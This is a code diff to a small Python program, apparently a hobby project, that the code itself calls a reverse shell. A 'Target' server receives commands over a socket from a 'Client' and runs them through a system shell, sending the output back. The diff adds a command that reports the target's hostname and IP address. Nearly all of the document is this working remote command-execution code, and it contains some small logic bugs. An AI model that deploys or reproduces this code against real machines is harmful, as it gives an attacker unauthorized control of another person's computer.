@@ -5,7 +5,7 @@ import subprocess
 
 class Machine:
     def __init__(self):
-        #create socket
+        # create socket
         try:
             self.s = socket.socket()
         except socket.error as msg:
@@ -15,7 +15,7 @@ class Machine:
         self.s.close()
 
 
-#client is "us"
+# client is "us"
 class Client(Machine):
     def __init__(self, host="127.0.0.1", port=9999):
         super().__init__()
@@ -26,33 +26,34 @@ class Client(Machine):
         self.s.connect((self.host, self.port))
 
     def reverse_shell_send_command(self):
+        self.s.send(str.encode("shell"))
+        print("-->")
         while True:
-            cmd = input()
-            if cmd == "quit":
-                self.s.send(str.encode(cmd))
-                client_response = str(self.s.recv(1024), "utf-8")
-                print(client_response)
-                self.quit()
-                break
+            cmd = input("")
             if len(str.encode(cmd)) > 0:
                 self.s.send(str.encode(cmd))
-                client_response = str(self.s.recv(1024), "utf-8")
-                print(client_response, end="")
+                client_response = str(self.s.recv(2048), "utf-8")
+                print(client_response)
 
-    def quit(self):
-        pass
+    def getinfo(self):
+        self.s.send(str.encode("getinfo"))
+        i = 0
+        while i < 2:
+            info = self.s.recv(4096)
+            print(str(i) + " : " + info.decode("utf-8"))
+            i = i + 1
 
 
-#Target is the server
+# Target is the server
 class Target(Machine):
 
-    #initialize host and port server
+    # initialize host and port server
     def __init__(self, host="", port=9999):
         super().__init__()
         self.host = host
         self.port = port
 
-    #bind de socket with the port
+    # bind de socket with the port
     def socket_bind(self):
         print("Bidding socket to port " + str(self.port))
         try:
@@ -63,26 +64,34 @@ class Target(Machine):
             if input() == "y" or "yes":
                 self.socket_bind()
 
-    #accept the new co
+    # accept the new co
     def socket_accept(self):
         global conn
         conn, address = self.s.accept()
         print("Connexion has been establish | " + "IP " + address[0] + " | Port : " + str(address[1]))
 
+    def what_to_do(self):
+        instruction = conn.recv(2048)
+        if instruction.decode("utf-8") == "getinfo":
+            self.getinfo_target()
+        if instruction.decode("utf-8") == "shell":
+            self.reverse_shell_target()
+        if instruction.decode("utf-8") != "quit":
+            self.quit()
+
     def reverse_shell_target(self):
-        while True:
-            data = conn.recv(1024)
+        shell_bool = True
+        while shell_bool:
+            data = conn.recv(2048)
             if data.decode("utf-8") == "quit":
-                print("Client program Shutdown")
-                conn.send(str.encode("Client Program Shutdown"))
-                break
+                conn.send(str.encode("Leaving Shell.."))
+                shell_bool = False
             else:
                 try:
                     if data[:2].decode("utf-8") == 'cd':
                         os.chdir(data[3:].decode("utf-8"))
                     if len(data) > 0:
                         cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                        print(cmd)
                         output_bytes = cmd.stdout.read() + cmd.stderr.read()
                         output_str = output_bytes.decode("utf-8", errors='replace')
                         conn.send(str.encode(output_str + str(os.getcwd()) + "> "))
@@ -92,7 +101,12 @@ class Target(Machine):
                     print(error_msg)
                     conn.send(str.encode(error_msg))
 
-    #close de connection and the socket
+    def getinfo_target(self):
+        conn.send(str.encode("Computer's name: " + socket.gethostname()))
+        conn.send(str.encode("IP : " + socket.gethostbyname(socket.gethostname())))
+        conn.send(str.encode("----"))
+
+    # close de connection and the socket
     def quit(self):
         try:
             conn.close()
